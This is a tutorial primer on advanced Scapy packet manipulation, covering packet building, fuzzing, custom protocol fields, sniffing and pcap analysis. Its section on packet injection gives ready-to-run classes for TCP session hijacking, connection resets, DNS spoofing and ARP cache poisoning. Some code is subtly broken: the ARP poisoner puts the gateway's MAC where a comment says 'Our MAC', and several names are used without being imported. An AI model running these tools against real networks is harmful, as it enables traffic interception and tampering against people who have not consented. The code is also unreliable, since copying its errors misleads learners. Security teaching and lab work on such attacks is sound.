# Primer 3: Scapy Advanced Packet Manipulation

## P3.1 Introduction to Scapy Advanced Features

### What Makes Scapy Powerful?

Scapy is more than just a packet sniffer—it's a complete packet manipulation framework. Think of it like a chemistry lab for network packets:
- **Mix and match** - Combine protocols like LEGO bricks
- **Experiment** - Create custom protocols
- **Analyze** - Inspect packets at every layer
- **Automate** - Build complex network tools

### Scapy Architecture

```
┌─────────────────────────────────────────────────────┐
│                   Your Python Code                   │
├─────────────────────────────────────────────────────┤
│                  Scapy API Layer                     │
├─────────────────────────────────────────────────────┤
│                Protocol Definitions                  │
│  ┌────┬────┬────┬────┬────┬────┬────┬────┬────┐   │
│  │IP  │TCP │UDP │ICMP│ARP │DNS │HTTP│Ether│...│   │
│  └────┴────┴────┴────┴────┴────┴────┴────┴────┘   │
├─────────────────────────────────────────────────────┤
│                 Packet Engine                       │
├─────────────────────────────────────────────────────┤
│         libpcap / Npcap / Raw Sockets              │
└─────────────────────────────────────────────────────┘
```

---

## P3.2 Packet Building Deep Dive

### Building Complex Packets

```python
from scapy.all import *
import random

# Building with different protocols
packet = Ether(src="00:11:22:33:44:55", dst="ff:ff:ff:ff:ff:ff") / \
         IP(src="192.168.1.100", dst="8.8.8.8", ttl=64) / \
         TCP(sport=12345, dport=80, flags="S", seq=1000) / \
         Raw(load=b"GET / HTTP/1.1\r\nHost: example.com\r\n\r\n")

# Show packet structure
packet.show()

# Layered construction
eth = Ether(dst="ff:ff:ff:ff:ff:ff")
ip = IP(dst="8.8.8.8")
tcp = TCP(dport=80, flags="S")
packet = eth / ip / tcp

# Adding payload
payload = b"Hello, World!"
packet = packet / Raw(load=payload)

# Adding multiple layers
packet = Ether() / IP() / TCP() / HTTP() / Raw()

# Modifying existing packet
packet[IP].ttl = 128
packet[TCP].window = 65535
del packet[TCP].chksum  # Force recalculation
```

### Building with Fragmentation

```python
from scapy.all import fragment

# Create a large packet
packet = IP(dst="192.168.1.1") / TCP(dport=80) / Raw(load=b"X" * 3000)

# Fragment the packet (MTU = 1500)
fragments = fragment(packet, fragsize=1500)

# Send fragments
for frag in fragments:
    send(frag, verbose=False)
    print(f"Sent fragment: {frag.summary()}")

# Fragment with specific offset
frag1 = IP(dst="192.168.1.1", flags=1, frag=0) / TCP(dport=80) / Raw(load=b"first")
frag2 = IP(dst="192.168.1.1", flags=1, frag=1480) / Raw(load=b"second")
# More fragments...
```

### Building with Fuzzing

```python
from scapy.all import fuzz, IP, TCP, send

# Basic fuzzing
def fuzz_packets(target_ip, target_port, count=10):
    """Send fuzzed TCP packets."""
    for i in range(count):
        # Fuzz the packet
        packet = fuzz(IP(dst=target_ip) / TCP(dport=target_port))
        
        # Send packet
        send(packet, verbose=False)
        print(f"Sent fuzzed packet {i + 1}: {packet.summary()}")

# Fuzz with constraints
def fuzz_with_constraints():
    # Keep some fields valid while fuzzing others
    base = IP(dst="192.168.1.1")
    tcp = TCP(dport=80)
    
    packet = base / tcp
    fuzzed = fuzz(packet)
    
    # Override specific fields
    fuzzed[IP].dst = "192.168.1.1"  # Keep target valid
    fuzzed[TCP].dport = 80  # Keep port valid
    fuzzed[TCP].flags = "S"  # Keep SYN flag
    
    send(fuzzed, verbose=False)

# Fuzz by replacing values
def custom_fuzz():
    packet = IP(dst="192.168.1.1") / TCP(dport=80)
    
    # Randomize fields
    packet[IP].ttl = random.randint(1, 255)
    packet[IP].src = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
    packet[TCP].seq = random.randint(0, 0xFFFFFFFF)
    packet[TCP].window = random.randint(1024, 65535)
    
    # Add random payload
    payload = os.urandom(random.randint(1, 100))
    packet = packet / Raw(load=payload)
    
    send(packet, verbose=False)
```

---

## P3.3 Advanced Packet Fields

### Working with Bit-Level Fields

```python
from scapy.all import Packet, BitField, ByteField, ShortField

class CustomFlags(Packet):
    """Custom packet with bit-level fields."""
    name = "Custom Flags"
    fields_desc = [
        BitField("flags1", 0, 4),   # 4 bits
        BitField("flags2", 0, 4),   # 4 bits
        BitField("reserved", 0, 8), # 8 bits
        ByteField("length", 0),     # 8 bits
        ShortField("value", 0),     # 16 bits
    ]

# Using bit fields
flags = CustomFlags(flags1=0xA, flags2=0x5, length=32, value=1024)
print(f"Flags: {flags.show()}")

# Convert to bytes
raw_bytes = bytes(flags)
print(f"Raw bytes: {raw_bytes.hex()}")

# Parse from bytes
parsed = CustomFlags(raw_bytes)
print(f"Parsed: flags1={parsed.flags1}, flags2={parsed.flags2}")
```

### Working with Optional Fields

```python
from scapy.all import Packet, FieldLenField, StrLenField

class VariablePacket(Packet):
    """Packet with variable-length fields."""
    name = "Variable Packet"
    fields_desc = [
        ByteField("version", 1),
        FieldLenField("data_len", None, length_of="data", fmt="B"),
        StrLenField("data", "", length_from=lambda pkt: pkt.data_len),
    ]

# Create variable-length packet
packet = VariablePacket(data=b"Hello, World!")
print(f"Packet: {packet.show()}")
print(f"Data length: {packet.data_len}")
print(f"Raw bytes: {bytes(packet).hex()}")

# Parse variable-length packet
raw = bytes(packet)
parsed = VariablePacket(raw)
print(f"Parsed data: {parsed.data}")
```

### Working with Conditional Fields

```python
from scapy.all import Packet, ByteField, ConditionalField, StrLenField, FieldLenField

class ConditionalPacket(Packet):
    """Packet with conditional fields."""
    name = "Conditional Packet"
    fields_desc = [
        ByteField("type", 1),
        FieldLenField("data_len", None, length_of="data", fmt="B"),
        StrLenField("data", "", length_from=lambda pkt: pkt.data_len),
        # Only include optional field if type is 2
        ConditionalField(
            StrLenField("optional_data", "", length_from=lambda pkt: pkt.data_len),
            lambda pkt: pkt.type == 2
        ),
    ]

# Type 1 packet (no optional field)
packet1 = ConditionalPacket(type=1, data=b"Type 1 data")
print("Type 1 packet:")
packet1.show()

# Type 2 packet (with optional field)
packet2 = ConditionalPacket(type=2, data=b"Type 2 data", optional_data=b"Optional")
print("\nType 2 packet:")
packet2.show()
```

---

## P3.4 Advanced Sniffing Techniques

### BPF Filter Deep Dive

```python
from scapy.all import sniff

# Complex BPF filters
filters = [
    # Specific host
    "host 192.168.1.1",
    
    # Specific network
    "net 192.168.0.0/16",
    
    # Protocol and port
    "tcp port 80 or tcp port 443",
    
    # Combination
    "host 192.168.1.1 and (tcp port 80 or tcp port 443)",
    
    # Exclude traffic
    "not arp and not icmp",
    
    # Specific flags
    "tcp[13] & 0x02 != 0",  # SYN flag
    "tcp[13] & 0x10 != 0",  # ACK flag
    "tcp[13] == 0x12",      # SYN-ACK
    
    # Specific TCP options
    "tcp[20:4] = 0x01030304",  # TCP timestamp option
    
    # Packet size
    "greater 1500",
    "less 64",
    
    # VLAN
    "vlan",
    "vlan 10",
    
    # IPv6
    "ip6",
    "ip6 host ::1",
]

# Apply filters
def sniff_with_filter(bpf_filter, count=10):
    print(f"Sniffing with filter: {bpf_filter}")
    packets = sniff(filter=bpf_filter, count=count, timeout=5)
    print(f"Captured {len(packets)} packets")
    for packet in packets:
        print(f"  {packet.summary()}")
```

### Packet Analysis with Scapy

```python
from scapy.all import sniff, IP, TCP, UDP, Raw
from collections import defaultdict
import re

class PacketAnalyzer:
    """Advanced packet analysis tools."""
    
    def __init__(self):
        self.packets = []
        self.protocol_stats = defaultdict(int)
        self.ip_stats = defaultdict(lambda: {'sent': 0, 'received': 0})
        self.port_stats = defaultdict(int)
    
    def analyze(self, packet):
        """Analyze a single packet."""
        self.packets.append(packet)
        
        # Protocol analysis
        if packet.haslayer(IP):
            ip = packet[IP]
            self.ip_stats[ip.src]['sent'] += 1
            self.ip_stats[ip.dst]['received'] += 1
            
            if packet.haslayer(TCP):
                self.protocol_stats['TCP'] += 1
                tcp = packet[TCP]
                self.port_stats[tcp.sport] += 1
                self.port_stats[tcp.dport] += 1
                
                # Analyze TCP flags
                flags = tcp.flags
                if 'S' in flags:
                    self.protocol_stats['TCP_SYN'] += 1
                if 'A' in flags:
                    self.protocol_stats['TCP_ACK'] += 1
                if 'F' in flags:
                    self.protocol_stats['TCP_FIN'] += 1
                if 'R' in flags:
                    self.protocol_stats['TCP_RST'] += 1
                
            elif packet.haslayer(UDP):
                self.protocol_stats['UDP'] += 1
                
            elif packet.haslayer(ICMP):
                self.protocol_stats['ICMP'] += 1
        
        elif packet.haslayer(ARP):
            self.protocol_stats['ARP'] += 1
    
    def get_stats(self):
        """Get analysis statistics."""
        return {
            'protocols': dict(self.protocol_stats),
            'top_speakers': self._get_top_speakers(10),
            'top_ports': sorted(self.port_stats.items(), key=lambda x: x[1], reverse=True)[:10],
            'total_packets': len(self.packets),
        }
    
    def _get_top_speakers(self, n):
        """Get top network speakers."""
        speakers = []
        for ip, stats in self.ip_stats.items():
            total = stats['sent'] + stats['received']
            speakers.append((ip, total, stats['sent'], stats['received']))
        
        return sorted(speakers, key=lambda x: x[1], reverse=True)[:n]
    
    def extract_http_requests(self):
        """Extract HTTP requests from packets."""
        requests = []
        for packet in self.packets:
            if packet.haslayer(HTTP):
                http = packet[HTTP]
                if hasattr(http, 'Method') and hasattr(http, 'Path'):
                    requests.append({
                        'method': http.Method,
                        'path': http.Path,
                        'host': getattr(http, 'Host', 'unknown'),
                        'user_agent': getattr(http, 'User_Agent', 'unknown'),
                        'packet': packet,
                    })
        return requests
    
    def extract_dns_queries(self):
        """Extract DNS queries."""
        queries = []
        for packet in self.packets:
            if packet.haslayer(DNSQR):
                dns = packet[DNS]
                if dns.qd:
                    queries.append({
                        'name': dns.qd.qname.decode() if dns.qd.qname else 'unknown',
                        'type': dns.qd.qtype,
                        'class': dns.qd.qclass,
                        'packet': packet,
                    })
        return queries

# Usage
analyzer = PacketAnalyzer()

def callback(packet):
    analyzer.analyze(packet)

# Sniff for 100 packets
sniff(prn=callback, count=100, timeout=10)

# Get statistics
stats = analyzer.get_stats()
print(f"Protocol stats: {stats['protocols']}")
print(f"Top speakers: {stats['top_speakers']}")
print(f"Top ports: {stats['top_ports']}")

# Extract HTTP requests
http_requests = analyzer.extract_http_requests()
print(f"HTTP requests: {len(http_requests)}")

# Extract DNS queries
dns_queries = analyzer.extract_dns_queries()
print(f"DNS queries: {len(dns_queries)}")
```

### Real-Time Packet Processing

```python
from scapy.all import sniff, IP, TCP
import threading
import queue
import time

class RealTimeProcessor:
    """Real-time packet processing with multi-threading."""
    
    def __init__(self, max_queue=1000):
        self.packet_queue = queue.Queue(maxsize=max_queue)
        self.results_queue = queue.Queue()
        self.running = False
        self.threads = []
        self.stats = {'processed': 0, 'dropped': 0}
    
    def start(self, filter_str=None, interface=None, num_workers=4):
        """Start packet processing."""
        self.running = True
        
        # Start sniffer thread
        sniffer_thread = threading.Thread(
            target=self._sniff_packets,
            args=(interface, filter_str),
            daemon=True
        )
        sniffer_thread.start()
        self.threads.append(sniffer_thread)
        
        # Start worker threads
        for i in range(num_workers):
            worker = threading.Thread(
                target=self._process_packets,
                args=(i,),
                daemon=True
            )
            worker.start()
            self.threads.append(worker)
        
        # Start result collector
        collector = threading.Thread(
            target=self._collect_results,
            daemon=True
        )
        collector.start()
        self.threads.append(collector)
    
    def _sniff_packets(self, interface, filter_str):
        """Sniff packets and add to queue."""
        def callback(packet):
            if self.running:
                try:
                    self.packet_queue.put_nowait(packet)
                except queue.Full:
                    self.stats['dropped'] += 1
        
        sniff(prn=callback, iface=interface, filter=filter_str, store=False)
    
    def _process_packets(self, worker_id):
        """Process packets from the queue."""
        while self.running:
            try:
                packet = self.packet_queue.get(timeout=0.5)
                
                # Process packet
                result = self._process_packet(packet)
                
                if result:
                    self.results_queue.put(result)
                
                self.packet_queue.task_done()
                self.stats['processed'] += 1
                
            except queue.Empty:
                continue
            except Exception as e:
                print(f"Worker {worker_id} error: {e}")
    
    def _process_packet(self, packet):
        """Process a single packet."""
        result = {
            'timestamp': time.time(),
            'packet': packet,
            'summary': packet.summary(),
            'analysis': {}
        }
        
        # Analyze packet
        if packet.haslayer(IP):
            ip = packet[IP]
            result['analysis']['ip'] = {
                'src': ip.src,
                'dst': ip.dst,
                'ttl': ip.ttl,
                'proto': ip.proto
            }
        
        if packet.haslayer(TCP):
            tcp = packet[TCP]
            result['analysis']['tcp'] = {
                'sport': tcp.sport,
                'dport': tcp.dport,
                'flags': tcp.flags,
                'seq': tcp.seq,
                'ack': tcp.ack
            }
        
        return result
    
    def _collect_results(self):
        """Collect and display results."""
        while self.running:
            try:
                result = self.results_queue.get(timeout=1)
                # Process result (e.g., display, store, etc.)
                print(f"Packet: {result['summary']}")
                if 'analysis' in result:
                    print(f"  Analysis: {result['analysis']}")
                self.results_queue.task_done()
            except queue.Empty:
                continue
    
    def stop(self):
        """Stop packet processing."""
        self.running = False
        for thread in self.threads:
            thread.join(timeout=1)
        print(f"Stats: {self.stats}")

# Usage
processor = RealTimeProcessor()
processor.start(filter_str="tcp", num_workers=2)

# Let it run for 10 seconds
time.sleep(10)

processor.stop()
```

---

## P3.5 Advanced Packet Injection

### TCP Session Hijacking

```python
from scapy.all import IP, TCP, send
import random

class TCPSessionHijacker:
    """TCP session hijacking utilities."""
    
    @staticmethod
    def hijack_connection(target_ip, target_port, src_ip, src_port, 
                         seq_num, ack_num, payload):
        """Hijack a TCP connection."""
        packet = IP(src=src_ip, dst=target_ip) / TCP(
            sport=src_port,
            dport=target_port,
            seq=seq_num,
            ack=ack_num,
            flags="PA",  # PSH + ACK
        ) / Raw(load=payload)
        
        send(packet, verbose=False)
        print(f"Sent hijacked packet: {packet.summary()}")
    
    @staticmethod
    def reset_connection(target_ip, target_port, src_ip, src_port, seq_num):
        """Reset a TCP connection."""
        packet = IP(src=src_ip, dst=target_ip) / TCP(
            sport=src_port,
            dport=target_port,
            seq=seq_num,
            flags="R"  # RST
        )
        
        send(packet, verbose=False)
        print(f"Sent RST packet: {packet.summary()}")
    
    @staticmethod
    def desync_sequence(connection):
        """Desynchronize TCP sequence numbers."""
        # Send packets with wrong sequence numbers
        for offset in [100, 500, 1000, 2000]:
            packet = IP(src=connection['src_ip'], dst=connection['dst_ip']) / TCP(
                sport=connection['src_port'],
                dport=connection['dst_port'],
                seq=connection['seq'] + offset,
                flags="A"
            )
            send(packet, verbose=False)
            print(f"Sent desync packet with offset {offset}")

# Example usage
# hijacker = TCPSessionHijacker()
# hijacker.hijack_connection(
#     target_ip="192.168.1.100",
#     target_port=22,
#     src_ip="192.168.1.1",
#     src_port=12345,
#     seq_num=1000,
#     ack_num=2000,
#     payload=b"echo 'Hacked!'\n"
# )
```

### DNS Spoofing

```python
from scapy.all import IP, UDP, DNS, DNSRR, send
import threading
import time

class DNSSpoofer:
    """DNS spoofing utility."""
    
    def __init__(self):
        self.spoofed_domains = {}
        self.running = False
        self.sniffer = None
    
    def add_spoof(self, domain, ip):
        """Add a domain to spoof."""
        self.spoofed_domains[domain] = ip
        print(f"Spoofing {domain} -> {ip}")
    
    def start(self, interface=None):
        """Start DNS spoofing."""
        self.running = True
        
        # Start sniffer for DNS queries
        from scapy.all import sniff
        
        def dns_callback(packet):
            if not self.running:
                return
            
            if packet.haslayer(DNS) and packet.haslayer(UDP):
                dns = packet[DNS]
                if dns.qr == 0:  # Query
                    qname = dns.qd.qname.decode().rstrip('.')
                    if qname in self.spoofed_domains:
                        # Send spoofed response
                        self._send_spoofed_response(packet, qname)
        
        # Sniff DNS queries (port 53)
        self.sniffer = threading.Thread(
            target=sniff,
            kwargs={
                'iface': interface,
                'filter': 'udp port 53',
                'prn': dns_callback,
                'store': False
            },
            daemon=True
        )
        self.sniffer.start()
        print("DNS spoofing started")
    
    def _send_spoofed_response(self, original_packet, domain):
        """Send a spoofed DNS response."""
        ip = original_packet[IP]
        udp = original_packet[UDP]
        dns = original_packet[DNS]
        
        # Build response packet
        response = IP(src=ip.dst, dst=ip.src) / UDP(
            sport=udp.dport,
            dport=udp.sport
        ) / DNS(
            id=dns.id,
            qr=1,  # Response
            aa=1,  # Authoritative
            qd=dns.qd,
            an=DNSRR(
                rrname=dns.qd.qname,
                type=1,  # A record
                ttl=300,
                rdata=self.spoofed_domains[domain]
            )
        )
        
        send(response, verbose=False)
        print(f"Spoofed DNS: {domain} -> {self.spoofed_domains[domain]}")
    
    def stop(self):
        """Stop DNS spoofing."""
        self.running = False
        if self.sniffer:
            self.sniffer.join(timeout=1)
        print("DNS spoofing stopped")

# Usage
# spoofer = DNSSpoofer()
# spoofer.add_spoof("example.com", "192.168.1.100")
# spoofer.start()
# time.sleep(60)
# spoofer.stop()
```

### ARP Cache Poisoning

```python
from scapy.all import Ether, ARP, sendp
import time
import threading

class ARPPoisoner:
    """ARP cache poisoning utility."""
    
    def __init__(self, interface=None):
        self.interface = interface
        self.targets = {}
        self.gateway_ip = None
        self.gateway_mac = None
        self.running = False
    
    def set_gateway(self, ip, mac):
        """Set gateway IP and MAC."""
        self.gateway_ip = ip
        self.gateway_mac = mac
    
    def add_target(self, ip, mac):
        """Add a target to poison."""
        self.targets[ip] = mac
    
    def start(self):
        """Start ARP poisoning."""
        self.running = True
        
        # Start poisoning thread
        poison_thread = threading.Thread(
            target=self._poison_loop,
            daemon=True
        )
        poison_thread.start()
        print("ARP poisoning started")
    
    def _poison_loop(self):
        """Send ARP poison packets."""
        while self.running:
            for target_ip, target_mac in self.targets.items():
                # Tell target we are the gateway
                packet = Ether(dst=target_mac) / ARP(
                    op=2,
                    psrc=self.gateway_ip,
                    pdst=target_ip,
                    hwdst=target_mac,
                    hwsrc=self.gateway_mac  # Our MAC
                )
                sendp(packet, iface=self.interface, verbose=False)
                
                # Tell gateway we are the target
                packet = Ether(dst=self.gateway_mac) / ARP(
                    op=2,
                    psrc=target_ip,
                    pdst=self.gateway_ip,
                    hwdst=self.gateway_mac,
                    hwsrc=self.gateway_mac  # Our MAC
                )
                sendp(packet, iface=self.interface, verbose=False)
            
            time.sleep(2)  # Send every 2 seconds
    
    def restore(self):
        """Restore ARP tables."""
        self.running = False
        
        # Send correct ARP entries
        for target_ip, target_mac in self.targets.items():
            # Tell target correct gateway MAC
            packet = Ether(dst=target_mac) / ARP(
                op=2,
                psrc=self.gateway_ip,
                pdst=target_ip,
                hwdst=target_mac,
                hwsrc=self.gateway_mac  # Correct gateway MAC
            )
            sendp(packet, iface=self.interface, verbose=False)
            
            # Tell gateway correct target MAC
            packet = Ether(dst=self.gateway_mac) / ARP(
                op=2,
                psrc=target_ip,
                pdst=self.gateway_ip,
                hwdst=self.gateway_mac,
                hwsrc=target_mac  # Correct target MAC
            )
            sendp(packet, iface=self.interface, verbose=False)
        
        print("ARP tables restored")

# Usage
# poisoner = ARPPoisoner(interface="eth0")
# poisoner.set_gateway("192.168.1.1", "00:11:22:33:44:55")
# poisoner.add_target("192.168.1.100", "aa:bb:cc:dd:ee:ff")
# poisoner.start()
# time.sleep(30)
# poisoner.restore()
```

---

## P3.6 Protocol Analysis & Decoding

### Custom Protocol Decoder

```python
from scapy.all import Packet, ByteField, StrLenField, FieldLenField
from scapy.fields import IPField

class CustomProtocol(Packet):
    """Custom protocol decoder."""
    name = "Custom Protocol"
    fields_desc = [
        ByteField("version", 1),
        ByteField("type", 0),
        FieldLenField("data_len", None, length_of="data", fmt="B"),
        StrLenField("data", "", length_from=lambda pkt: pkt.data_len),
    ]
    
    def mysummary(self):
        """Custom summary."""
        return f"Custom(v={self.version}, type={self.type}, len={self.data_len})"

# Decode captured data
def decode_custom_packet(raw_data):
    """Decode a custom protocol packet."""
    try:
        packet = CustomProtocol(raw_data)
        print(f"Version: {packet.version}")
        print(f"Type: {packet.type}")
        print(f"Data length: {packet.data_len}")
        print(f"Data: {packet.data}")
        return packet
    except Exception as e:
        print(f"Decode failed: {e}")
        return None

# Example with raw data
raw = bytes([1, 2, 5, 72, 101, 108, 108, 111])  # version=1, type=2, len=5, data="Hello"
packet = decode_custom_packet(raw)
```

### Protocol Dissector

```python
from scapy.all import Packet, bind_layers, IP, TCP

class MyProtocol(Packet):
    """Custom protocol dissector."""
    name = "MyProtocol"
    fields_desc = [
        ByteField("type", 0),
        ByteField("flags", 0),
        ShortField("length", 0),
    ]

# Bind to TCP port
bind_layers(TCP, MyProtocol, sport=12345)

# Dissect packets
def dissect_protocol(packet):
    if packet.haslayer(MyProtocol):
        proto = packet[MyProtocol]
        print(f"Protocol type: {proto.type}")
        print(f"Flags: {proto.flags}")
        print(f"Length: {proto.length}")

# Example: create and dissect
packet = IP(dst="192.168.1.1") / TCP(sport=12345) / MyProtocol(type=1, flags=2, length=100)
dissect_protocol(packet)
```

### Pcap Analysis

```python
from scapy.all import rdpcap, IP, TCP, UDP
from collections import Counter
import datetime

class PcapAnalyzer:
    """PCAP file analyzer."""
    
    def __init__(self, pcap_file):
        self.packets = rdpcap(pcap_file)
        self.pcap_file = pcap_file
        self.stats = {}
    
    def analyze(self):
        """Analyze the PCAP file."""
        self.stats = {
            'total_packets': len(self.packets),
            'protocols': Counter(),
            'ip_flows': Counter(),
            'port_flows': Counter(),
            'top_speakers': Counter(),
            'timestamps': [],
            'sizes': [],
            'http_requests': [],
            'dns_queries': [],
        }
        
        for packet in self.packets:
            # Size
            self.stats['sizes'].append(len(packet))
            self.stats['timestamps'].append(packet.time)
            
            # Protocol
            if packet.haslayer(IP):
                ip = packet[IP]
                proto_name = self._get_protocol_name(packet)
                self.stats['protocols'][proto_name] += 1
                
                # IP flow
                flow = f"{ip.src} -> {ip.dst}"
                self.stats['ip_flows'][flow] += 1
                
                # Speakers
                self.stats['top_speakers'][ip.src] += 1
                self.stats['top_speakers'][ip.dst] += 1
                
                # Port flow (TCP/UDP)
                if packet.haslayer(TCP):
                    tcp = packet[TCP]
                    port_flow = f"{tcp.sport} -> {tcp.dport}"
                    self.stats['port_flows'][port_flow] += 1
                    
                    # HTTP detection
                    if tcp.dport == 80 or tcp.sport == 80:
                        self._check_http(packet)
                        
                elif packet.haslayer(UDP):
                    udp = packet[UDP]
                    port_flow = f"{udp.sport} -> {udp.dport}"
                    self.stats['port_flows'][port_flow] += 1
                    
                    # DNS detection
                    if udp.dport == 53 or udp.sport == 53:
                        self._check_dns(packet)
        
        return self.stats
    
    def _get_protocol_name(self, packet):
        """Get protocol name."""
        if packet.haslayer(TCP):
            return "TCP"
        elif packet.haslayer(UDP):
            return "UDP"
        elif packet.haslayer(ICMP):
            return "ICMP"
        elif packet.haslayer(ARP):
            return "ARP"
        else:
            return "Other"
    
    def _check_http(self, packet):
        """Check for HTTP requests."""
        if packet.haslayer(Raw):
            try:
                data = packet[Raw].load.decode('utf-8', errors='ignore')
                if data.startswith(('GET', 'POST', 'PUT', 'DELETE', 'HEAD')):
                    lines = data.split('\r\n')
                    if lines:
                        self.stats['http_requests'].append({
                            'method': lines[0].split()[0],
                            'path': lines[0].split()[1] if len(lines[0].split()) > 1 else '',
                            'time': packet.time,
                        })
            except:
                pass
    
    def _check_dns(self, packet):
        """Check for DNS queries."""
        if packet.haslayer(DNS):
            dns = packet[DNS]
            if dns.qd:
                try:
                    name = dns.qd.qname.decode().rstrip('.')
                    self.stats['dns_queries'].append({
                        'name': name,
                        'type': dns.qd.qtype,
                        'time': packet.time,
                    })
                except:
                    pass
    
    def print_stats(self):
        """Print statistics in a readable format."""
        if not self.stats:
            self.analyze()
        
        print(f"PCAP Analysis: {self.pcap_file}")
        print(f"Total packets: {self.stats['total_packets']}")
        print(f"Packet size: min={min(self.stats['sizes'])}, max={max(self.stats['sizes'])}, avg={sum(self.stats['sizes'])/len(self.stats['sizes']):.1f}")
        
        print("\nProtocol distribution:")
        for proto, count in self.stats['protocols'].most_common():
            print(f"  {proto}: {count} ({count/self.stats['total_packets']*100:.1f}%)")
        
        print("\nTop 5 speakers:")
        for ip, count in self.stats['top_speakers'].most_common(5):
            print(f"  {ip}: {count}")
        
        print("\nTop 5 IP flows:")
        for flow, count in self.stats['ip_flows'].most_common(5):
            print(f"  {flow}: {count}")
        
        print(f"\nHTTP requests: {len(self.stats['http_requests'])}")
        print(f"DNS queries: {len(self.stats['dns_queries'])}")

# Usage
# analyzer = PcapAnalyzer("capture.pcap")
# analyzer.analyze()
# analyzer.print_stats()
```

---

## P3.7 Scapy Performance Optimization

### Optimized Sniffing

```python
from scapy.all import sniff, conf
import time

class OptimizedSniffer:
    """Optimized packet sniffer."""
    
    def __init__(self):
        # Performance settings
        conf.use_pcap = True  # Use libpcap
        conf.verb = 0         # Quiet mode
        
        self.stats = {
            'packets_captured': 0,
            'packets_processed': 0,
            'dropped_packets': 0,
            'start_time': None,
            'end_time': None,
        }
    
    def sniff_optimized(self, interface=None, filter_str=None, count=1000, timeout=10):
        """Optimized packet sniffing."""
        self.stats['start_time'] = time.time()
        self.stats['packets_captured'] = 0
        
        def callback(packet):
            self.stats['packets_captured'] += 1
            # Process packet
            
        # Sniff with optimized settings
        packets = sniff(
            iface=interface,
            filter=filter_str,
            prn=callback,
            count=count,
            timeout=timeout,
            store=False,  # Don't store packets
            promisc=True,
            opened_socket=None,  # Use default socket
        )
        
        self.stats['end_time'] = time.time()
        return packets
    
    def get_stats(self):
        """Get capture statistics."""
        elapsed = self.stats['end_time'] - self.stats['start_time'] if self.stats['end_time'] else 0
        return {
            'packets_captured': self.stats['packets_captured'],
            'time_elapsed': elapsed,
            'packets_per_second': self.stats['packets_captured'] / elapsed if elapsed > 0 else 0,
        }

# Usage
# sniffer = OptimizedSniffer()
# packets = sniffer.sniff_optimized(filter_str="tcp", count=1000, timeout=5)
# print(sniffer.get_stats())
```

### Batch Packet Processing

```python
from scapy.all import sniff, IP, TCP
import time

class BatchProcessor:
    """Batch packet processor for high throughput."""
    
    def __init__(self, batch_size=100, processing_callback=None):
        self.batch_size = batch_size
        self.buffer = []
        self.callback = processing_callback
        self.stats = {'batches_processed': 0, 'packets_processed': 0}
    
    def process_callback(self, packet):
        """Callback for packet processing."""
        self.buffer.append(packet)
        
        if len(self.buffer) >= self.batch_size:
            self._process_batch()
    
    def _process_batch(self):
        """Process a batch of packets."""
        if self.callback:
            self.callback(self.buffer)
        
        self.stats['batches_processed'] += 1
        self.stats['packets_processed'] += len(self.buffer)
        self.buffer = []
    
    def start(self, interface=None, filter_str=None, count=0):
        """Start sniffing with batch processing."""
        sniff(
            iface=interface,
            filter=filter_str,
            prn=self.process_callback,
            count=count,
            store=False,
        )
    
    def get_stats(self):
        """Get processing statistics."""
        return self.stats

# Example batch processor
def analyze_batch(batch):
    """Analyze a batch of packets."""
    print(f"Processing batch of {len(batch)} packets")
    for packet in batch:
        if packet.haslayer(IP):
            print(f"  {packet[IP].src} -> {packet[IP].dst}")
        elif packet.haslayer(TCP):
            print(f"  TCP: {packet[TCP].dport}")

# Usage
# processor = BatchProcessor(batch_size=10, processing_callback=analyze_batch)
# processor.start(filter_str="ip", count=50)
```

---

## P3.8 Quick Reference

### Common Scapy Commands

| Command | Description |
|---------|-------------|
| `send(packet)` | Send packet at Layer 3 |
| `sendp(packet)` | Send packet at Layer 2 |
| `sr1(packet)` | Send and receive 1 response |
| `sr(packet)` | Send and receive responses |
| `sniff()` | Capture packets |
| `rdpcap(file)` | Read PCAP file |
| `wrpcap(file, packets)` | Write PCAP file |
| `fuzz(packet)` | Fuzz a packet |
| `fragment(packet)` | Fragment a packet |
| `packet.show()` | Show packet structure |
| `packet.summary()` | Show packet summary |

### Common Protocol Access

```python
# IP Layer
packet[IP].src
packet[IP].dst
packet[IP].ttl
packet[IP].proto

# TCP Layer
packet[TCP].sport
packet[TCP].dport
packet[TCP].seq
packet[TCP].ack
packet[TCP].flags

# UDP Layer
packet[UDP].sport
packet[UDP].dport

# ICMP Layer
packet[ICMP].type
packet[ICMP].code

# Ethernet Layer
packet[Ether].src
packet[Ether].dst

# ARP Layer
packet[ARP].op
packet[ARP].psrc
packet[ARP].pdst
packet[ARP].hwsrc
packet[ARP].hwdst
```

### Performance Checklist

- [ ] Use `store=False` for sniffing
- [ ] Set `conf.verb = 0` for quiet mode
- [ ] Use `conf.use_pcap = True` for libpcap
- [ ] Use batch processing for large captures
- [ ] Filter early to reduce packet processing
- [ ] Use `AsyncSniffer` for non-blocking capture
- [ ] Avoid storing unnecessary packets
- [ ] Use `rdpcap()` for analysis after capture

---

[COMPLETED: Primer 3 - Scapy Advanced Packet Manipulation]
